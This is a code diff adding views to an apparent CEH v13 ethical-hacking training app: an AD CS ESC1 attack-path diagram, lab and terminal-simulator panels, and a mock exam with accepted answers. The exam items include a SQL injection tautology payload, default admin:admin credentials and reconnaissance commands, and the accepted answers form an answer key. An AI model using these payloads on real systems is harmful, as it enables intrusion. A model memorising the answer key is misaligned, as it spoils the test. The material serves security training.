+                    <marker id="arrow-red" viewBox="0 0 10 10" refX="5" refY="5" markerWidth="6" markerHeight="6" orient="auto-start-reverse">
+                      <path d="M 0 0 L 10 5 L 0 10 z" fill="#ef4444" />
+                    </marker>
+                  </defs>
+
+                  <!-- Node 1: Domain User -->
+                  <g class="cursor-pointer" onclick="showToast('Node 1: Unprivileged Domain User account cadet_trainee with standard domain membership.', 'info')">
+                    <circle cx="85" cy="85" r="36" fill="#151b2e" stroke="#06b6d4" stroke-width="2.5" />
+                    <text x="85" y="80" text-anchor="middle" font-size="16">👤</text>
+                    <text x="85" y="100" text-anchor="middle" fill="#06b6d4" font-size="9" font-weight="bold">cadet_trainee</text>
+                    <text x="85" y="135" text-anchor="middle" fill="#64748b" font-size="8">Domain Users</text>
+                  </g>
+
+                  <!-- Edge 1 -> 2 -->
+                  <path d="M 125 85 L 255 85" stroke="#8b5cf6" stroke-width="2.5" stroke-dasharray="4" marker-end="url(#arrow)" />
+                  <text x="190" y="75" text-anchor="middle" fill="#c084fc" font-size="8" font-weight="bold">Enroll Rights</text>
+
+                  <!-- Node 2: Certificate Template -->
+                  <g class="cursor-pointer" onclick="showToast('Node 2: WebServer-Custom template has CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT and Client Auth EKU!', 'error')">
+                    <circle cx="305" cy="85" r="36" fill="#151b2e" stroke="#8b5cf6" stroke-width="2.5" />
+                    <text x="305" y="80" text-anchor="middle" font-size="16">📜</text>
+                    <text x="305" y="100" text-anchor="middle" fill="#c084fc" font-size="9" font-weight="bold">WebServer-Custom</text>
+                    <text x="305" y="135" text-anchor="middle" fill="#ef4444" font-size="8" font-weight="bold">ESC1 VULNERABLE</text>
+                  </g>
+
+                  <!-- Edge 2 -> 3 -->
+                  <path d="M 345 85 L 475 85" stroke="#8b5cf6" stroke-width="2.5" stroke-dasharray="4" marker-end="url(#arrow)" />
+                  <text x="410" y="75" text-anchor="middle" fill="#c084fc" font-size="8" font-weight="bold">Requests SAN: Admin</text>
+
+                  <!-- Node 3: Enterprise CA -->
+                  <g class="cursor-pointer" onclick="showToast('Node 3: CA01.CORP.LOCAL Enterprise CA signs certificate with arbitrary SAN.', 'info')">
+                    <circle cx="525" cy="85" r="36" fill="#151b2e" stroke="#f59e0b" stroke-width="2.5" />
+                    <text x="525" y="80" text-anchor="middle" font-size="16">🏛️</text>
+                    <text x="525" y="100" text-anchor="middle" fill="#fbbf24" font-size="9" font-weight="bold">CA01 (Root CA)</text>
+                    <text x="525" y="135" text-anchor="middle" fill="#64748b" font-size="8">Issues Certificate</text>
+                  </g>
+
+                  <!-- Edge 3 -> 4 -->
+                  <path d="M 565 85 L 695 85" stroke="#ef4444" stroke-width="2.5" stroke-dasharray="4" marker-end="url(#arrow-red)" />
+                  <text x="630" y="75" text-anchor="middle" fill="#f87171" font-size="8" font-weight="bold">PKINIT Kerberos TGT</text>
+
+                  <!-- Node 4: Domain Admin -->
+                  <g class="cursor-pointer" onclick="showToast('Node 4: Full Domain Admin takeover achieved via Kerberos PKINIT certificate authentication!', 'success')">
+                    <circle cx="745" cy="85" r="40" fill="#2d121c" stroke="#ef4444" stroke-width="3" />
+                    <text x="745" y="80" text-anchor="middle" font-size="18">👑</text>
+                    <text x="745" y="100" text-anchor="middle" fill="#f87171" font-size="9" font-weight="bold">Administrator</text>
+                    <text x="745" y="140" text-anchor="middle" fill="#ef4444" font-size="8" font-weight="bold">FULL COMPROMISE</text>
+                  </g>
+                </svg>
+              </div>
+            </div>
+          ` : ''}
+
+          <!-- Step-by-Step Procedures Section -->
+          <div class="space-y-4">
+            <div class="flex items-center justify-between">
+              <h2 class="text-lg font-mono font-bold text-white flex items-center gap-2">
+                <span>📋</span> <span>Hands-on Lab Procedures</span>
+              </h2>
+              <span class="text-xs font-mono text-slate-400">Step completion: <span id="lab-step-progress">${labProg.completedSteps.length}/${lab.steps.length}</span></span>
+            </div>
+
+            <div class="space-y-4">
+              ${lab.steps.map(step => renderLabStep(lab.id, step, labProg.completedSteps.includes(step.stepNumber))).join('')}
+            </div>
+          </div>
+
+          <!-- Troubleshooting & Security Concepts -->
+          <div class="grid grid-cols-1 lg:grid-cols-2 gap-4">
+            
+            <!-- Troubleshooting Accordion -->
+            <div class="bg-charcoal-900 p-5 rounded-xl border border-charcoal-800 space-y-3">
+              <h3 class="text-xs font-mono font-bold text-amber-400 uppercase tracking-wider flex items-center gap-1.5">
+                <span>⚠️</span> <span>Troubleshooting &amp; Common Pitfalls</span>
+              </h3>
+              <div class="space-y-2">
+                ${(lab.troubleshooting || []).map(tb => `
+                  <details class="bg-charcoal-850 p-3 rounded-lg border border-charcoal-700/60 group">
+                    <summary class="cursor-pointer font-mono font-bold text-xs text-slate-200 group-hover:text-white select-none">
+                      ▸ ${escapeHtml(tb.issue)}
+                    </summary>
+                    <div class="pt-2 pl-4 text-xs font-mono space-y-1 text-slate-400 mt-1 border-t border-charcoal-700/40">
+                      <div><strong class="text-rose-400">Cause:</strong> ${escapeHtml(tb.cause)}</div>
+                      <div><strong class="text-cyber-emerald">Solution:</strong> ${escapeHtml(tb.solution)}</div>
+                    </div>
+                  </details>
+                `).join('')}
+              </div>
+            </div>
+
+            <!-- Defensive Remediation & Hardening -->
+            <div class="bg-charcoal-900 p-5 rounded-xl border border-charcoal-800 space-y-3">
+              <h3 class="text-xs font-mono font-bold text-cyber-emerald uppercase tracking-wider flex items-center gap-1.5">
+                <span>🛡️</span> <span>Defensive Measures &amp; Remediation</span>
+              </h3>
+              <p class="text-xs font-mono text-slate-300 leading-relaxed">
+                ${escapeHtml(lab.defensiveRemediation)}
+              </p>
+              <div class="p-3 rounded-lg bg-charcoal-850 border border-charcoal-700 text-xs font-mono text-slate-400">
+                <strong class="text-slate-200 block mb-1">Core Security Concept:</strong>
+                ${escapeHtml(lab.securityConcepts)}
+              </div>
+            </div>
+
+          </div>
+
+          <!-- Completion Checklist & Notes Panel -->
+          <div class="grid grid-cols-1 lg:grid-cols-2 gap-4">
+            
+            <!-- Checklist -->
+            <div class="bg-charcoal-900 p-5 rounded-xl border border-charcoal-800 space-y-3">
+              <h3 class="text-xs font-mono font-bold text-slate-400 uppercase tracking-wider flex items-center gap-1.5">
+                <span>☑️</span> <span>Lab Completion Checklist</span>
+              </h3>
+              <div class="space-y-2">
+                ${lab.checklist.map((item, idx) => {
+                  const isChecked = labProg.completedChecklist.includes(idx);
+                  return `
+                    <label class="flex items-start gap-2.5 p-2 rounded-lg hover:bg-charcoal-850 cursor-pointer font-mono text-xs transition">
+                      <input type="checkbox" onchange="toggleChecklistItem('${lab.id}', ${idx})" ${isChecked ? 'checked' : ''} class="mt-0.5 rounded bg-charcoal-800 border-charcoal-600 text-cyber-emerald focus:ring-0">
+                      <span class="${isChecked ? 'line-through text-slate-500' : 'text-slate-300'}">${escapeHtml(item)}</span>
+                    </label>
+                  `;
+                }).join('')}
+              </div>
+            </div>
+
+            <!-- Notes Panel -->
+            <div class="bg-charcoal-900 p-5 rounded-xl border border-charcoal-800 space-y-3 flex flex-col justify-between">
+              <div>
+                <div class="flex items-center justify-between mb-2">
+                  <h3 class="text-xs font-mono font-bold text-slate-400 uppercase tracking-wider flex items-center gap-1.5">
+                    <span>📝</span> <span>Personal Lab Notes (Auto-Saved)</span>
+                  </h3>
+                  <span id="notes-save-indicator" class="text-[10px] font-mono text-slate-500">Saved</span>
+                </div>
+                <textarea id="lab-notes-input" oninput="handleNotesInput('${lab.id}', event)" placeholder="Record findings, command modifications, and flag interpretations here..." class="w-full h-32 p-3 bg-charcoal-850 border border-charcoal-700 rounded-lg text-xs font-mono text-slate-200 placeholder-slate-600 focus:outline-none focus:border-cyber-cyan transition resize-none">${escapeHtml(noteContent)}</textarea>
+              </div>
+              <div class="flex items-center justify-between pt-2 border-t border-charcoal-800 text-xs font-mono">
+                <span class="text-slate-500 text-[11px]">Included in downloadable report</span>
+                <button onclick="saveNotesExplicitly('${lab.id}')" class="px-3 py-1 rounded bg-charcoal-800 hover:bg-charcoal-700 text-slate-300 text-xs font-bold transition">Save Notes</button>
+              </div>
+            </div>
+
+          </div>
+
+          <!-- Interactive CTF Lab Flag Capture Card -->
+          <div class="bg-gradient-to-r from-charcoal-900 via-charcoal-850 to-charcoal-900 p-5 rounded-xl border ${isFlagVerified ? 'border-cyber-emerald/60 bg-emerald-950/15' : 'border-cyber-cyan/40'} space-y-3 font-mono">
+            <div class="flex flex-col sm:flex-row sm:items-center justify-between gap-2">
+              <div class="flex items-center gap-2">
+                <span class="text-base">${isFlagVerified ? '🏆' : '🚩'}</span>
+                <h3 class="text-xs font-bold uppercase tracking-wider text-white">
+                  Lab Flag Verification: <span class="${isFlagVerified ? 'text-cyber-emerald' : 'text-cyber-cyan'}">${isFlagVerified ? 'Verified (+50 XP)' : 'Awaiting Proof'}</span>
+                </h3>
+              </div>
+              ${isFlagVerified ? `
+                <span class="inline-flex items-center gap-1.5 px-2.5 py-0.5 rounded-full bg-emerald-500/15 border border-emerald-500/40 text-cyber-emerald text-[11px] font-bold">
+                  <span>✔</span> <span>FLAG CAPTURED</span>
+                </span>
+              ` : ''}
+            </div>
+
+            <p class="text-xs text-slate-400">
+              Execute the technical lab procedures above to discover the cryptographic proof flag, then submit it below to verify practical mastery.
+            </p>
+
+            <div class="flex flex-col sm:flex-row items-stretch sm:items-center gap-2 pt-1">
+              <input id="lab-flag-input-${lab.id}" type="text" value="${isFlagVerified ? (CEHState.flags[lab.id] || LAB_FLAGS_LOOKUP[lab.id]?.flag || '') : ''}" ${isFlagVerified ? 'readonly' : ''} onkeydown="if(event.key==='Enter') submitLabFlag('${lab.id}')" placeholder="FLAG{...}" class="flex-1 p-2.5 rounded-lg bg-charcoal-950 border ${isFlagVerified ? 'border-cyber-emerald/40 text-emerald-300' : 'border-charcoal-700 text-cyber-cyan'} text-xs placeholder-slate-600 focus:outline-none focus:border-cyber-cyan transition">
+              <button onclick="submitLabFlag('${lab.id}')" ${isFlagVerified ? 'disabled' : ''} class="px-4 py-2.5 rounded-lg ${isFlagVerified ? 'bg-charcoal-800 text-slate-500 cursor-not-allowed' : 'bg-cyber-cyan hover:bg-cyan-400 text-black font-bold shadow glow-cyan'} text-xs transition shrink-0">
+                ${isFlagVerified ? 'Flag Verified ✔' : 'Submit Flag ➔'}
+              </button>
+            </div>
+
+            <details class="text-[11px] text-slate-500 pt-1">
+              <summary class="cursor-pointer hover:text-slate-300 select-none">💡 Need a hint to locate this flag?</summary>
+              <div class="pt-2 pl-2 text-slate-400 leading-relaxed">
+                ${LAB_FLAGS_LOOKUP[lab.id]?.hint || 'Execute the lab commands in the simulated terminal to inspect outputs and find the flag.'}
+              </div>
+            </details>
+          </div>
+
+          <!-- Bottom: Jump to Knowledge-Check Quiz -->
+          ${quiz ? `
+            <div class="bg-gradient-to-r from-charcoal-900 to-charcoal-850 p-6 rounded-2xl border border-charcoal-800 space-y-4">
+              <div class="flex flex-col sm:flex-row items-stretch sm:items-center justify-between gap-4">
+                <div>
+                  <div class="inline-flex items-center gap-1 text-cyber-amber font-mono text-xs font-bold mb-1">
+                    <span>🧠</span> <span>Knowledge Check</span>
+                  </div>
+                  <h3 class="text-lg font-mono font-bold text-white">Module ${lab.moduleNumber} Exam Readiness Quiz</h3>
+                  <p class="text-xs font-mono text-slate-400">Test your mastery of core CEH v13 objectives and question patterns for this module.</p>
+                </div>
+                <button onclick="openQuizModal(${lab.moduleId})" class="px-5 py-2.5 rounded-xl bg-cyber-amber hover:bg-amber-400 text-black font-mono font-bold text-xs shadow glow-amber shrink-0 transition">
+                  Start Module Quiz (${quiz && quiz.questions ? quiz.questions.length : 3} Qs) ➔
+                </button>
+              </div>
+            </div>
+          ` : ''}
+
+        </div>
+      `;
+    }
+
+    function renderLabStep(labId, step, isCompleted) {
+      return `
+        <div class="bg-charcoal-900 rounded-xl border border-charcoal-800 p-5 space-y-3">
+          <div class="flex items-start justify-between gap-2">
+            <div class="flex items-center gap-2">
+              <span class="w-6 h-6 rounded-full bg-charcoal-800 border border-charcoal-700 flex items-center justify-center font-mono font-bold text-xs text-cyber-cyan">${step.stepNumber}</span>
+              <h3 class="font-mono font-bold text-white text-sm">${escapeHtml(step.title)}</h3>
+            </div>
+            <label class="flex items-center gap-1.5 text-xs font-mono cursor-pointer select-none">
+              <input type="checkbox" onchange="toggleStepComplete('${labId}', ${step.stepNumber})" ${isCompleted ? 'checked' : ''} class="rounded bg-charcoal-800 border-charcoal-700 text-cyber-cyan focus:ring-0">
+              <span class="${isCompleted ? 'text-cyber-cyan font-bold' : 'text-slate-400'}">Done</span>
+            </label>
+          </div>
+
+          <!-- Command Box with Syntax Highlighting, Copy & Auto-Type -->
+          <div class="bg-charcoal-950 rounded-lg border border-charcoal-800 p-3 relative group">
+            <div class="flex items-center justify-between mb-2">
+              <span class="text-[10px] font-mono uppercase text-slate-500 font-bold">Terminal Command</span>
+              <div class="flex items-center gap-2">
+                <button onclick="copyCommand('${step.command.replace(/'/g, "\\'")}', event)" class="px-2.5 py-1 rounded bg-charcoal-850 hover:bg-charcoal-800 text-cyber-cyan border border-charcoal-700 text-[11px] font-mono transition flex items-center gap-1">
+                  <span>📋</span> <span>Copy</span>
+                </button>
+                <button onclick="autoTypeCommand('${step.command.replace(/'/g, "\\'")}')" class="px-2.5 py-1 rounded bg-cyber-emerald/15 hover:bg-cyber-emerald/25 text-cyber-emerald border border-cyber-emerald/30 text-[11px] font-mono transition font-bold flex items-center gap-1">
+                  <span>⚡</span> <span>Auto-Type</span>
+                </button>
+              </div>
+            </div>
+            <pre class="font-mono text-xs text-slate-100 overflow-x-auto whitespace-pre-wrap select-all font-semibold leading-relaxed">${escapeHtml(step.command)}</pre>
+          </div>
+
+          <!-- Explanation of Command -->
+          <p class="text-xs font-mono text-slate-400 leading-relaxed">
+            <strong class="text-slate-300">Explanation:</strong> ${escapeHtml(step.explanation)}
+          </p>
+
+          <!-- Expected Output & Interpretation -->
+          <div class="grid grid-cols-1 md:grid-cols-2 gap-3 pt-2">
+            <div class="space-y-1">
+              <div class="text-[10px] font-mono uppercase text-slate-500 font-bold">Expected Output:</div>
+              <pre class="bg-charcoal-950 p-2.5 rounded border border-charcoal-800 text-[11px] font-mono text-slate-300 overflow-x-auto max-h-32 whitespace-pre leading-relaxed">${escapeHtml(step.expectedOutput)}</pre>
+            </div>
+            <div class="space-y-1">
+              <div class="text-[10px] font-mono uppercase text-slate-500 font-bold">Result Interpretation:</div>
+              <div class="bg-charcoal-850 p-2.5 rounded border border-charcoal-700/60 text-[11px] font-mono text-slate-300 leading-relaxed max-h-32 overflow-y-auto">
+                ${escapeHtml(step.interpretation)}
+              </div>
+            </div>
+          </div>
+        </div>
+      `;
+    }
+
+    // --- VIEW 4: FULL TERMINAL SIMULATOR ---
+    function renderFullTerminalView() {
+      return `
+        <div class="space-y-6">
+          <div class="flex items-center justify-between">
+            <div>
+              <h1 class="text-2xl font-mono font-bold text-white mb-1">CEH v13 Educational Terminal Simulator</h1>
+              <p class="text-xs font-mono text-slate-400">Safe simulated environment executing reconnaissance, system audit, and defensive commands.</p>
+            </div>
+            <button onclick="clearTerminal()" class="px-3 py-1.5 rounded-lg bg-charcoal-850 hover:bg-charcoal-800 border border-charcoal-700 font-mono text-xs text-slate-300">
+              Clear Screen
+            </button>
+          </div>
+
+          <!-- Terminal Frame -->
+          <div class="bg-charcoal-950 rounded-2xl border border-charcoal-800 shadow-2xl overflow-hidden flex flex-col h-[600px]">
+            <div class="bg-charcoal-900 px-4 py-2.5 border-b border-charcoal-800 flex items-center justify-between font-mono text-xs">
+              <div class="flex items-center gap-2">
+                <span class="w-3 h-3 rounded-full bg-rose-500/80"></span>
+                <span class="w-3 h-3 rounded-full bg-amber-500/80"></span>
+                <span class="w-3 h-3 rounded-full bg-emerald-500/80"></span>
+                <span class="ml-2 text-slate-300 font-bold">cadet@ceh-enclave: ~ (bash 5.1.16)</span>
+              </div>
+              <span class="text-slate-500 text-[11px]">Subnet: 10.10.20.10/24</span>
+            </div>
+
+            <!-- Terminal Output Scroll Area -->
+            <div id="full-terminal-output" class="p-4 flex-1 overflow-y-auto font-mono text-xs space-y-2 text-slate-200">
+              ${CEHState.terminalLines.map(l => formatTerminalLine(l)).join('')}
+            </div>
+
+            <!-- Terminal Prompt Input -->
+            <div class="p-3 bg-charcoal-900 border-t border-charcoal-800 flex items-center gap-2">
+              <span class="text-cyber-emerald font-mono font-bold text-xs">cadet@ceh-node:~$</span>
+              <input id="full-terminal-input" type="text" onkeydown="handleFullTerminalKey(event)" placeholder="Enter command (e.g. uname -a, nmap -sS, ss -tulpn, iptables, dig, openssl)..." class="flex-1 bg-transparent font-mono text-xs text-white focus:outline-none placeholder-slate-600">
+              <button onclick="submitFullTerminalCommand()" class="px-4 py-1.5 rounded-lg bg-cyber-cyan hover:bg-cyan-400 text-black font-mono font-bold text-xs transition">
+                Execute
+              </button>
+            </div>
+          </div>
+        </div>
+      `;
+    }
+
+    // --- VIEW 5: REPORT GENERATOR ---
+    function renderReportView() {
+      const totalLabs = CEHState.labs.length || 21;
+      const completedLabs = Object.values(CEHState.progress).filter(p => p.isCompleted).length;
+      const readinessPct = Math.round((completedLabs / totalLabs) * 100);
+
+      return `
+        <div class="space-y-6">
+          <div class="flex flex-col sm:flex-row items-stretch sm:items-center justify-between gap-4">
+            <div>
+              <h1 class="text-2xl font-mono font-bold text-white mb-1">CEH v13 Practical Assessment Report</h1>
+              <p class="text-xs font-mono text-slate-400">Downloadable Markdown &amp; Printable audit summary documenting lab completions, notes, and quiz verdicts.</p>
+            </div>
+            <div class="flex items-center gap-2">
+              <button onclick="downloadMarkdownReport()" class="px-4 py-2 rounded-xl bg-cyber-emerald hover:bg-emerald-400 text-black font-mono font-bold text-xs shadow glow-emerald transition flex items-center gap-1.5">
+                <span>📥</span> <span>Download Markdown (.md)</span>
+              </button>
+              <button onclick="window.print()" class="px-4 py-2 rounded-xl bg-charcoal-850 hover:bg-charcoal-800 border border-charcoal-700 text-white font-mono font-bold text-xs transition flex items-center gap-1.5">
+                <span>🖨️</span> <span>Print / PDF</span>
+              </button>
+            </div>
+          </div>
+
+          <!-- Report Document Sheet -->
+          <div class="bg-charcoal-900 p-8 rounded-2xl border border-charcoal-800 font-mono text-xs space-y-6 max-w-4xl mx-auto shadow-2xl text-slate-300 leading-relaxed">
+            <div class="border-b border-charcoal-800 pb-4 flex justify-between items-start">
+              <div>
+                <h2 class="text-lg font-bold text-white">CEH v13 Practical Examination Audit Summary</h2>
+                <div class="text-slate-400 mt-1">Candidate Callsign: <span class="text-cyber-cyan font-bold">CyberCadet_01</span></div>
+                <div class="text-slate-500 text-[11px]">Enclave Scope: 10.10.20.0/24 | Generated: ${new Date().toUTCString()}</div>
+              </div>
+              <div class="text-right">
+                <span class="px-3 py-1 rounded bg-cyber-emerald/15 text-cyber-emerald border border-cyber-emerald/30 font-bold text-sm">${readinessPct}% Completed</span>
+              </div>
+            </div>
+
+            <!-- Summary Statistics -->
+            <div>
+              <h3 class="text-sm font-bold text-white uppercase tracking-wider mb-2">1. Executive Overview</h3>
+              <p class="text-slate-400">
+                The candidate has completed ${completedLabs} of ${totalLabs} practical hands-on laboratories within the authorized HackRange CEH v13 sandbox environment, encompassing all 20 EC-Council examination domains and the advanced Active Directory Certificate Services (AD CS) privilege escalation module.
+              </p>
+            </div>
+
+            <!-- Lab Completion Breakdown Table -->
+            <div>
+              <h3 class="text-sm font-bold text-white uppercase tracking-wider mb-2">2. Practical Labs Verification Matrix</h3>
+              <div class="overflow-x-auto rounded-lg border border-charcoal-800">
+                <table class="w-full text-left text-xs">
+                  <thead class="bg-charcoal-950 text-slate-400 border-b border-charcoal-800">
+                    <tr>
+                      <th class="py-2 px-3">Module</th>
+                      <th class="py-2 px-3">Topic Title</th>
+                      <th class="py-2 px-3">Difficulty</th>
+                      <th class="py-2 px-3">Status</th>
+                    </tr>
+                  </thead>
+                  <tbody class="divide-y divide-charcoal-800/60">
+                    ${CEHState.labs.map(l => {
+                      const isDone = (CEHState.progress[l.id] || {}).isCompleted;
+                      return `
+                        <tr>
+                          <td class="py-2 px-3 text-slate-400">M${l.moduleNumber}</td>
+                          <td class="py-2 px-3 font-bold text-white">${escapeHtml(l.title)}</td>
+                          <td class="py-2 px-3 text-slate-400">${l.difficulty}</td>
+                          <td class="py-2 px-3 ${isDone ? 'text-cyber-emerald font-bold' : 'text-slate-500'}">${isDone ? '✔ PASSED' : 'PENDING'}</td>
+                        </tr>
+                      `;
+                    }).join('')}
+                  </tbody>
+                </table>
+              </div>
+            </div>
+
+            <!-- Student Recorded Findings & Notes -->
+            <div>
+              <h3 class="text-sm font-bold text-white uppercase tracking-wider mb-2">3. Candidate Technical Notes</h3>
+              <div class="space-y-3">
+                ${Object.entries(CEHState.notes).length > 0 ? Object.entries(CEHState.notes).map(([labId, txt]) => `
+                  <div class="bg-charcoal-950 p-3 rounded-lg border border-charcoal-800 space-y-1">
+                    <span class="text-cyber-cyan font-bold block">${labId} Findings:</span>
+                    <pre class="text-slate-300 whitespace-pre-wrap text-[11px] font-mono">${escapeHtml(txt)}</pre>
+                  </div>
+                `).join('') : '<p class="text-slate-500 italic">No per-lab notes recorded yet.</p>'}
+              </div>
+            </div>
+          </div>
+        </div>
+      `;
+    }
+
+    // --- VIEW 6: CEH v13 PRACTICAL MOCK EXAM SIMULATOR (6-HOUR TIMED CHALLENGE) ---
+    const MOCK_EXAM_CHALLENGES = [
+      {
+        id: 1,
+        title: "Challenge 01: Authoritative DNS Discovery",
+        category: "Reconnaissance",
+        points: 5,
+        scenario: "During passive reconnaissance against 'corp-target.local', identify the IP address of the primary authoritative nameserver responsible for the domain zone.",
+        flagFormat: "IP Address (e.g. 10.10.x.x)",
+        acceptedAnswers: ["10.10.20.2"],
+        hint: "Run dig @10.10.20.2 corp-target.local NS in the terminal."
+      },
+      {
+        id: 2,
+        title: "Challenge 02: Network Daemon Versioning",
+        category: "Scanning",
+        points: 5,
+        scenario: "Execute a TCP service version scan against port 21 on target host 10.10.20.50. What is the exact software daemon banner string reported?",
+        flagFormat: "Daemon and version (e.g. vsftpd x.x.x)",
+        acceptedAnswers: ["vsftpd 2.3.4", "vsftpd-2.3.4"],
+        hint: "Run nmap -sS -sV -p 21 10.10.20.50 in the terminal."
+      },
+      {
+        id: 3,
+        title: "Challenge 03: Vulnerability Intelligence (CVE)",
+        category: "Vulnerability Analysis",
+        points: 5,
+        scenario: "Identify the unique CVE identifier assigned to the notorious backdoor flaw embedded in vsftpd 2.3.4.",
+        flagFormat: "CVE-YYYY-NNNN",
+        acceptedAnswers: ["CVE-2011-2523", "cve-2011-2523"],
+        hint: "Search NVD or run curl for vsftpd 2.3.4 backdoor CVE."
+      },
+      {
+        id: 4,
+        title: "Challenge 04: SMB Anonymous Share Enumeration",
+        category: "Enumeration",
+        points: 5,
+        scenario: "Enumerate the SMB daemon on 10.10.20.50 using null credentials. What is the name of the unauthenticated disk share exposed to cadets?",
+        flagFormat: "Share name",
+        acceptedAnswers: ["public", "Public"],
+        hint: "Run smbclient -L //10.10.20.50 -N in the terminal."
+      },
+      {
+        id: 5,
+        title: "Challenge 05: Linux Local Privilege Escalation",
+        category: "System Hacking",
+        points: 5,
+        scenario: "Audit the Linux filesystem for non-standard SUID root binaries in /usr/local/bin. What is the full path of the anomalous binary?",
+        flagFormat: "Absolute path (e.g. /usr/local/bin/xxx)",
+        acceptedAnswers: ["/usr/local/bin/custom_backup", "custom_backup"],
+        hint: "Run find / -perm -4000 -user root -type f in the terminal."
+      },
+      {
+        id: 6,
+        title: "Challenge 06: Antivirus Verification Digest",
+        category: "Malware Threats",
+        points: 5,
+        scenario: "Calculate the cryptographic SHA-256 digest of the standard EICAR antivirus test file. What are the first 8 hex characters of the hash?",
+        flagFormat: "8 hexadecimal characters",
+        acceptedAnswers: ["275a021b", "275A021B"],
+        hint: "Compute sha256sum eicar.com in the terminal."
+      },
+      {
+        id: 7,
+        title: "Challenge 07: Cleartext Traffic Interception",
+        category: "Sniffing",
+        points: 5,
+        scenario: "Analyze intercepted HTTP POST packets traversing port 80. What cleartext password was transmitted by the user 'admin'?",
+        flagFormat: "Password string",
+        acceptedAnswers: ["Password123!", "Password123"],
+        hint: "Inspect tcpdump output from Lab 08."
+      },
+      {
+        id: 8,
+        title: "Challenge 08: Phishing Header Forensics",
+        category: "Social Engineering",
+        points: 5,
+        scenario: "Inspect the RFC 5322 Received headers of the suspicious invoice email. What was the true external IP of the originating relay server?",
+        flagFormat: "IPv4 address",
+        acceptedAnswers: ["198.51.100.44"],
+        hint: "Check the bottom-most Received header in Lab 09."
+      },
+      {
+        id: 9,
+        title: "Challenge 09: Web Session Attribute Hardening",
+        category: "Session Security",
+        points: 5,
+        scenario: "Audit the Set-Cookie response header from 10.10.20.50. Which critical flag is missing that allows tokens to be transmitted over unencrypted HTTP?",
+        flagFormat: "Cookie attribute name",
+        acceptedAnswers: ["Secure", "secure"],
+        hint: "Cookies lacking this attribute will transmit across unencrypted HTTP."
+      },
+      {
+        id: 10,
+        title: "Challenge 10: Slow HTTP DoS Mitigation",
+        category: "Denial of Service",
+        points: 5,
+        scenario: "Which Apache module provides the RequestReadTimeout directive to abort slow HTTP header drip attacks?",
+        flagFormat: "Module name (mod_xxx)",
+        acceptedAnswers: ["mod_reqtimeout", "reqtimeout"],
+        hint: "Review Lab 10 defensive configurations."
+      },
+      {
+        id: 11,
+        title: "Challenge 11: Web Server Banner Suppression",
+        category: "Web Server Security",
+        points: 5,
+        scenario: "Which Apache directive setting reduces the Server header banner to return only 'Apache' without version numbers or operating system details?",
+        flagFormat: "Directive value (e.g. ServerTokens xxx)",
+        acceptedAnswers: ["ServerTokens Prod", "Prod", "servertokens prod"],
+        hint: "Options include Full, OS, Min, and Prod."
+      },
+      {
+        id: 12,
+        title: "Challenge 12: Broken Object Level Authorization",
+        category: "Web Application Security",
+        points: 5,
+        scenario: "In the training target API, what user ID parameter was accessed without authorization to retrieve the administrator's 2FA TOTP secret?",
+        flagFormat: "Numeric ID",
+        acceptedAnswers: ["1", "id=1", "/api/users/1"],
+        hint: "Review the IDOR demonstration in Lab 14."
+      },
+      {
+        id: 13,
+        title: "Challenge 13: SQL Injection Tautology Vector",
+        category: "SQL Injection",
+        points: 5,
+        scenario: "What classic single-quote tautology payload injected into the password field causes the SQL query WHERE clause to evaluate to TRUE for all rows?",
+        flagFormat: "SQL payload snippet",
+        acceptedAnswers: ["' OR '1'='1", "' or '1'='1", "' OR 1=1 --", "' or 1=1 --"],
+        hint: "Review Lab 15 dynamic query manipulation."
+      },
+      {
+        id: 14,
+        title: "Challenge 14: WPA3 SAE Protocol Security",
+        category: "Wireless Security",
+        points: 5,
+        scenario: "What authentication protocol replaced the 4-way PSK handshake in WPA3-Personal to defeat offline dictionary cracking?",
+        flagFormat: "Protocol acronym or full name",
+        acceptedAnswers: ["SAE", "Simultaneous Authentication of Equals", "Dragonfly"],
+        hint: "Uses zero-knowledge Dragonfly key exchange."
+      },
+      {
+        id: 15,
+        title: "Challenge 15: Android Manifest Data Backup",
+        category: "Mobile Security",
+        points: 5,
+        scenario: "What attribute in AndroidManifest.xml must be explicitly set to 'false' to prevent unauthorized backup extraction over ADB?",
+        flagFormat: "Attribute name",
+        acceptedAnswers: ["android:allowBackup", "allowBackup", "allowBackup='false'"],
+        hint: "Look at the application tag in Lab 17."
+      },
+      {
+        id: 16,
+        title: "Challenge 16: Embedded IoT Default Access",
+        category: "IoT Security",
+        points: 5,
+        scenario: "What factory default username and password combination granted immediate root shell access to the simulated IoT BusyBox Telnet port?",
+        flagFormat: "user:pass",
+        acceptedAnswers: ["admin:admin", "admin / admin"],
+        hint: "Standard factory credentials tested in Lab 18."
+      },
+      {
+        id: 17,
+        title: "Challenge 17: Cloud Identity Verification",
+        category: "Cloud Security",
+        points: 5,
+        scenario: "What AWS CLI command is used by security auditors to verify the active authenticated STS caller identity and AWS Account ID?",
+        flagFormat: "Full CLI command",
+        acceptedAnswers: ["aws sts get-caller-identity", "sts get-caller-identity"],
+        hint: "Queries the AWS Security Token Service."
+      },
+      {
+        id: 18,
+        title: "Challenge 18: Symmetric Encryption Standards",
+        category: "Cryptography",
+        points: 5,
+        scenario: "What symmetric cipher algorithm and block cipher mode was used in OpenSSL to encrypt the confidential findings with PBKDF2 key derivation?",
+        flagFormat: "Cipher mode (e.g. aes-xxx-xxx)",
+        acceptedAnswers: ["aes-256-cbc", "AES-256-CBC", "aes-256-cbc with pbkdf2"],
+        hint: "Review OpenSSL command syntax in Lab 20."
+      },
+      {
+        id: 19,
+        title: "Challenge 19: AD CS ESC1 Template Flag",
+        category: "Enterprise Identity",
+        points: 5,
+        scenario: "In Active Directory Certificate Services, what certificate template flag allows the enrollee to supply an arbitrary Subject Alternative Name (SAN)?",
+        flagFormat: "Flag constant name",
+        acceptedAnswers: ["CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT", "enrollee supplies subject", "1", "msPKI-Certificate-Name-Flag 1"],
+        hint: "Review ESC1 misconfiguration in Lab 21 / AD CS."
+      },
+      {
+        id: 20,
+        title: "Challenge 20: AD CS ESC8 Web Enrollment Defense",
+        category: "Enterprise Identity",
+        points: 5,
+        scenario: "What authentication defense mechanism must be enforced on the AD CS /certsrv/ IIS directory to defeat NTLM relay attacks?",
+        flagFormat: "Defense acronym or name",
+        acceptedAnswers: ["EPA", "Extended Protection for Authentication", "HTTPS with EPA"],
+        hint: "Protects against credential relay by binding TLS channel parameters."
+      }
+    ];
+
+    function renderMockExamView() {
+      const solvedCount = Object.keys(CEHState.examVerified).length;
+      const totalChallenges = MOCK_EXAM_CHALLENGES.length;
